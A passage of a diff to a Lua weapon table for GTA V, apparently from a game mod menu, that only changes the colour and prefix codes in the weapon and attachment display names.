+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_SNSPISTOL_CLIP_02'
                     }
                 }
@@ -1851,54 +1859,54 @@ local b7 = {
         },
         SNSPistolMkII = {
             id = 'weapon_snspistol_mk2',
-            name = '~h~~r~> ~s~SNS Pistol Mk II',
+            name = '~h~~p~» ~s~SNS Pistol Mk II',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_SNSPISTOL_MK2_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_SNSPISTOL_MK2_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Tracer Rounds',
+                        name = '~h~~p~» ~s~Tracer Rounds',
                         id = 'COMPONENT_SNSPISTOL_MK2_CLIP_TRACER'
                     },
                     {
-                        name = '~h~~r~> ~s~Incendiary Rounds',
+                        name = '~h~~p~» ~s~Incendiary Rounds',
                         id = 'COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY'
                     },
                     {
-                        name = '~h~~r~> ~s~Hollow Point Rounds',
+                        name = '~h~~p~» ~s~Hollow Point Rounds',
                         id = 'COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT'
                     },
                     {
-                        name = '~h~~r~> ~s~FMJ Rounds',
+                        name = '~h~~p~» ~s~FMJ Rounds',
                         id = 'COMPONENT_SNSPISTOL_MK2_CLIP_FMJ'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Mounted Scope',
+                        name = '~h~~p~» ~s~Mounted Scope',
                         id = 'COMPONENT_AT_PI_RAIL_02'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_PI_FLSH_03'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Compensator',
+                        name = '~h~~p~» ~s~Compensator',
                         id = 'COMPONENT_AT_PI_COMP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_PI_SUPP_02'
                     }
                 }
@@ -1906,28 +1914,28 @@ local b7 = {
         },
         HeavyPistol = {
             id = 'weapon_heavypistol',
-            name = '~h~~r~> ~s~Heavy Pistol',
+            name = '~h~~p~» ~s~Heavy Pistol',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_HEAVYPISTOL_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_HEAVYPISTOL_CLIP_02'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_PI_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_PI_SUPP'
                     }
                 }
@@ -1935,16 +1943,16 @@ local b7 = {
         },
         VintagePistol = {
             id = 'weapon_vintagepistol',
-            name = '~h~~r~> ~s~Vintage Pistol',
+            name = '~h~~p~» ~s~Vintage Pistol',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_VINTAGEPISTOL_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_VINTAGEPISTOL_CLIP_02'
                     }
                 },
@@ -1958,68 +1966,68 @@ local b7 = {
         },
         FlareGun = {
             id = 'weapon_flaregun',
-            name = '~h~~r~> ~s~Flare Gun',
+            name = '~h~~p~» ~s~Flare Gun',
             bInfAmmo = false,
             mods = {}
         },
         MarksmanPistol = {
             id = 'weapon_marksmanpistol',
-            name = '~h~~r~> ~s~Marksman Pistol',
+            name = '~h~~p~» ~s~Marksman Pistol',
             bInfAmmo = false,
             mods = {}
         },
         HeavyRevolver = {
             id = 'weapon_revolver',
-            name = '~h~~r~> ~s~Heavy Revolver',
+            name = '~h~~p~» ~s~Heavy Revolver',
             bInfAmmo = false,
             mods = {}
         },
         HeavyRevolverMkII = {
             id = 'weapon_revolver_mk2',
-            name = '~h~~r~> ~s~Heavy Revolver Mk II',
+            name = '~h~~p~» ~s~Heavy Revolver Mk II',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Rounds',
+                        name = '~h~~p~» ~s~Default Rounds',
                         id = 'COMPONENT_REVOLVER_MK2_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Tracer Rounds',
+                        name = '~h~~p~» ~s~Tracer Rounds',
                         id = 'COMPONENT_REVOLVER_MK2_CLIP_TRACER'
                     },
                     {
-                        name = '~h~~r~> ~s~Incendiary Rounds',
+                        name = '~h~~p~» ~s~Incendiary Rounds',
                         id = 'COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY'
                     },
                     {
-                        name = '~h~~r~> ~s~Hollow Point Rounds',
+                        name = '~h~~p~» ~s~Hollow Point Rounds',
                         id = 'COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT'
                     },
                     {
-                        name = '~h~~r~> ~s~FMJ Rounds',
+                        name = '~h~~p~» ~s~FMJ Rounds',
                         id = 'COMPONENT_REVOLVER_MK2_CLIP_FMJ'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Holograhpic Sight',
+                        name = '~h~~p~» ~s~Holograhpic Sight',
                         id = 'COMPONENT_AT_SIGHTS'
                     },
                     {
-                        name = '~h~~r~> ~s~Small Scope',
+                        name = '~h~~p~» ~s~Small Scope',
                         id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_PI_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Compensator',
+                        name = '~h~~p~» ~s~Compensator',
                         id = 'COMPONENT_AT_PI_COMP_03'
                     }
                 }
@@ -2027,13 +2035,13 @@ local b7 = {
         },
         DoubleActionRevolver = {
             id = 'weapon_doubleaction',
-            name = '~h~~r~> ~s~Double Action Revolver',
+            name = '~h~~p~» ~s~Double Action Revolver',
             bInfAmmo = false,
             mods = {}
         },
         UpnAtomizer = {
             id = 'weapon_raypistol',
-            name = '~h~~r~> ~s~Up-n-Atomizer',
+            name = '~h~~p~» ~s~Up-n-Atomizer',
             bInfAmmo = false,
             mods = {}
         }
@@ -2041,34 +2049,34 @@ local b7 = {
     SMG = {
         MicroSMG = {
             id = 'weapon_microsmg',
-            name = '~h~~r~> ~s~Micro SMG',
+            name = '~h~~p~» ~s~Micro SMG',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_MICROSMG_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_MICROSMG_CLIP_02'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_MACRO'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_PI_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP_02'
                     }
                 }
@@ -2076,38 +2084,38 @@ local b7 = {
         },
         SMG = {
             id = 'weapon_smg',
-            name = '~h~~r~> ~s~SMG',
+            name = '~h~~p~» ~s~SMG',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_SMG_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_SMG_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Drum Magazine',
+                        name = '~h~~p~» ~s~Drum Magazine',
                         id = 'COMPONENT_SMG_CLIP_03'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_MACRO_02'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_PI_SUPP'
                     }
                 }
@@ -2115,96 +2123,96 @@ local b7 = {
         },
         SMGMkII = {
             id = 'weapon_smg_mk2',
-            name = '~h~~r~> ~s~SMG Mk II',
+            name = '~h~~p~» ~s~SMG Mk II',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_SMG_MK2_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_SMG_MK2_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Tracer Rounds',
+                        name = '~h~~p~» ~s~Tracer Rounds',
                         id = 'COMPONENT_SMG_MK2_CLIP_TRACER'
                     },
                     {
-                        name = '~h~~r~> ~s~Incendiary Rounds',
+                        name = '~h~~p~» ~s~Incendiary Rounds',
                         id = 'COMPONENT_SMG_MK2_CLIP_INCENDIARY'
                     },
                     {
-                        name = '~h~~r~> ~s~Hollow Point Rounds',
+                        name = '~h~~p~» ~s~Hollow Point Rounds',
                         id = 'COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT'
                     },
                     {
-                        name = '~h~~r~> ~s~FMJ Rounds',
+                        name = '~h~~p~» ~s~FMJ Rounds',
                         id = 'COMPONENT_SMG_MK2_CLIP_FMJ'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Holograhpic Sight',
+                        name = '~h~~p~» ~s~Holograhpic Sight',
                         id = 'COMPONENT_AT_SIGHTS_SMG'
                     },
                     {
-                        name = '~h~~r~> ~s~Small Scope',
+                        name = '~h~~p~» ~s~Small Scope',
                         id = 'COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2'
                     },
                     {
-                        name = '~h~~r~> ~s~Medium Scope',
+                        name = '~h~~p~» ~s~Medium Scope',
                         id = 'COMPONENT_AT_SCOPE_SMALL_SMG_MK2'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 Barrel = {
                     {
-                        name = '~h~~r~> ~s~Default',
+                        name = '~h~~p~» ~s~Default',
                         id = 'COMPONENT_AT_SB_BARREL_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy',
+                        name = '~h~~p~» ~s~Heavy',
                         id = 'COMPONENT_AT_SB_BARREL_02'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_PI_SUPP'
                     },
                     {
-                        name = '~h~~r~> ~s~Flat Muzzle Brake',
+                        name = '~h~~p~» ~s~Flat Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
+                        name = '~h~~p~» ~s~Tactical Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Fat-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_03'
                     },
                     {
-                        name = '~h~~r~> ~s~Precision Muzzle Brake',
+                        name = '~h~~p~» ~s~Precision Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_04'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
+                        name = '~h~~p~» ~s~Heavy Duty Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_05'
                     },
                     {
-                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
+                        name = '~h~~p~» ~s~Slanted Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_06'
                     },
                     {
-                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Split-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_07'
                     }
                 }
@@ -2212,34 +2220,34 @@ local b7 = {
         },
         AssaultSMG = {
             id = 'weapon_assaultsmg',
-            name = '~h~~r~> ~s~Assault SMG',
+            name = '~h~~p~» ~s~Assault SMG',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_ASSAULTSMG_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_ASSAULTSMG_CLIP_02'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_MACRO'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP_02'
                     }
                 }
@@ -2247,38 +2255,38 @@ local b7 = {
         },
         CombatPDW = {
             id = 'weapon_combatpdw',
-            name = '~h~~r~> ~s~Combat PDW',
+            name = '~h~~p~» ~s~Combat PDW',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_COMBATPDW_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_COMBATPDW_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Drum Magazine',
+                        name = '~h~~p~» ~s~Drum Magazine',
                         id = 'COMPONENT_COMBATPDW_CLIP_03'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_SMALL'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP'
                     }
                 }
@@ -2286,26 +2294,26 @@ local b7 = {
         },
         MachinePistol = {
             id = 'weapon_machinepistol',
-            name = '~h~~r~> ~s~Machine Pistol ',
+            name = '~h~~p~» ~s~Machine Pistol ',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_MACHINEPISTOL_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_MACHINEPISTOL_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Drum Magazine',
+                        name = '~h~~p~» ~s~Drum Magazine',
                         id = 'COMPONENT_MACHINEPISTOL_CLIP_03'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_PI_SUPP'
                     }
                 }
@@ -2313,16 +2321,16 @@ local b7 = {
         },
         MiniSMG = {
             id = 'weapon_minismg',
-            name = '~h~~r~> ~s~Mini SMG',
+            name = '~h~~p~» ~s~Mini SMG',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_MINISMG_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_MINISMG_CLIP_02'
                     }
                 }
@@ -2330,7 +2338,7 @@ local b7 = {
         },
         UnholyHellbringer = {
             id = 'weapon_raycarbine',
-            name = '~h~~r~> ~s~Unholy Hellbringer',
+            name = '~h~~p~» ~s~Unholy Hellbringer',
             bInfAmmo = false,
             mods = {}
         }
@@ -2338,7 +2346,7 @@ local b7 = {
     Shotguns = {
         PumpShotgun = {
             id = 'weapon_pumpshotgun',
-            name = '~h~~r~> ~s~Pump Shotgun',
+            name = '~h~~p~» ~s~Pump Shotgun',
             bInfAmmo = false,
             mods = {
                 Flashlight = {
@@ -2349,7 +2357,7 @@ local b7 = {
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_SR_SUPP'
                     }
                 }
@@ -2357,58 +2365,58 @@ local b7 = {
         },
         PumpShotgunMkII = {
             id = 'weapon_pumpshotgun_mk2',
-            name = '~h~~r~> ~s~Pump Shotgun Mk II',
+            name = '~h~~p~» ~s~Pump Shotgun Mk II',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Shells',
+                        name = '~h~~p~» ~s~Default Shells',
                         id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Dragon Breath Shells',
+                        name = '~h~~p~» ~s~Dragon Breath Shells',
                         id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY'
                     },
                     {
-                        name = '~h~~r~> ~s~Steel Buckshot Shells',
+                        name = '~h~~p~» ~s~Steel Buckshot Shells',
                         id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING'
                     },
                     {
-                        name = '~h~~r~> ~s~Flechette Shells',
+                        name = '~h~~p~» ~s~Flechette Shells',
                         id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT'
                     },
                     {
-                        name = '~h~~r~> ~s~Explosive Slugs',
+                        name = '~h~~p~» ~s~Explosive Slugs',
                         id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Holograhpic Sight',
+                        name = '~h~~p~» ~s~Holograhpic Sight',
                         id = 'COMPONENT_AT_SIGHTS'
                     },
                     {
-                        name = '~h~~r~> ~s~Small Scope',
+                        name = '~h~~p~» ~s~Small Scope',
                         id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                     },
                     {
-                        name = '~h~~r~> ~s~Medium Scope',
+                        name = '~h~~p~» ~s~Medium Scope',
                         id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_SR_SUPP_03'
                     },
                     {
-                        name = '~h~~r~> ~s~Squared Muzzle Brake',
+                        name = '~h~~p~» ~s~Squared Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_08'
                     }
                 }
@@ -2416,40 +2424,40 @@ local b7 = {
         },
         SawedOffShotgun = {
             id = 'weapon_sawnoffshotgun',
-            name = '~h~~r~> ~s~Sawed-Off Shotgun',
+            name = '~h~~p~» ~s~Sawed-Off Shotgun',
             bInfAmmo = false,
             mods = {}
         },
         AssaultShotgun = {
             id = 'weapon_assaultshotgun',
-            name = '~h~~r~> ~s~Assault Shotgun',
+            name = '~h~~p~» ~s~Assault Shotgun',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_02'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP'
                     }
                 }
@@ -2457,24 +2465,24 @@ local b7 = {
         },
         BullpupShotgun = {
             id = 'weapon_bullpupshotgun',
-            name = '~h~~r~> ~s~Bullpup Shotgun',
+            name = '~h~~p~» ~s~Bullpup Shotgun',
             bInfAmmo = false,
             mods = {
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP_02'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP'
                     }
                 }
@@ -2482,44 +2490,44 @@ local b7 = {
         },
         Musket = {
             id = 'weapon_musket',
-            name = '~h~~r~> ~s~Musket',
+            name = '~h~~p~» ~s~Musket',
             bInfAmmo = false,
             mods = {}
         },
         HeavyShotgun = {
             id = 'weapon_heavyshotgun',
-            name = '~h~~r~> ~s~Heavy Shotgun',
+            name = '~h~~p~» ~s~Heavy Shotgun',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_HEAVYSHOTGUN_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Drum Magazine',
+                        name = '~h~~p~» ~s~Drum Magazine',
                         id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP_02'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP'
                     }
                 }
@@ -2527,13 +2535,13 @@ local b7 = {
         },
         DoubleBarrelShotgun = {
             id = 'weapon_dbshotgun',
-            name = '~h~~r~> ~s~Double Barrel Shotgun',
+            name = '~h~~p~» ~s~Double Barrel Shotgun',
             bInfAmmo = false,
             mods = {}
         },
         SweeperShotgun = {
             id = 'weapon_autoshotgun',
-            name = '~h~~r~> ~s~Sweeper Shotgun',
+            name = '~h~~p~» ~s~Sweeper Shotgun',
             bInfAmmo = false,
             mods = {}
         }
@@ -2541,44 +2549,44 @@ local b7 = {
     AssaultRifles = {
         AssaultRifle = {
             id = 'weapon_assaultrifle',
-            name = '~h~~r~> ~s~Assault Rifle',
+            name = '~h~~p~» ~s~Assault Rifle',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_ASSAULTRIFLE_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_ASSAULTRIFLE_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Drum Magazine',
+                        name = '~h~~p~» ~s~Drum Magazine',
                         id = 'COMPONENT_ASSAULTRIFLE_CLIP_03'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_MACRO'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP_02'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP'
                     }
                 }
@@ -2586,102 +2594,102 @@ local b7 = {
         },
         AssaultRifleMkII = {
             id = 'weapon_assaultrifle_mk2',
-            name = '~h~~r~> ~s~Assault Rifle Mk II',
+            name = '~h~~p~» ~s~Assault Rifle Mk II',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Tracer Rounds',
+                        name = '~h~~p~» ~s~Tracer Rounds',
                         id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER'
                     },
                     {
-                        name = '~h~~r~> ~s~Incendiary Rounds',
+                        name = '~h~~p~» ~s~Incendiary Rounds',
                         id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY'
                     },
                     {
-                        name = '~h~~r~> ~s~Hollow Point Rounds',
+                        name = '~h~~p~» ~s~Hollow Point Rounds',
                         id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING'
                     },
                     {
-                        name = '~h~~r~> ~s~FMJ Rounds',
+                        name = '~h~~p~» ~s~FMJ Rounds',
                         id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Holograhpic Sight',
+                        name = '~h~~p~» ~s~Holograhpic Sight',
                         id = 'COMPONENT_AT_SIGHTS'
                     },
                     {
-                        name = '~h~~r~> ~s~Small Scope',
+                        name = '~h~~p~» ~s~Small Scope',
                         id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                     },
                     {
-                        name = '~h~~r~> ~s~Large Scope',
+                        name = '~h~~p~» ~s~Large Scope',
                         id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 Barrel = {
                     {
-                        name = '~h~~r~> ~s~Default',
+                        name = '~h~~p~» ~s~Default',
                         id = 'COMPONENT_AT_AR_BARREL_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy',
+                        name = '~h~~p~» ~s~Heavy',
                         id = 'COMPONENT_AT_AR_BARREL_0'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
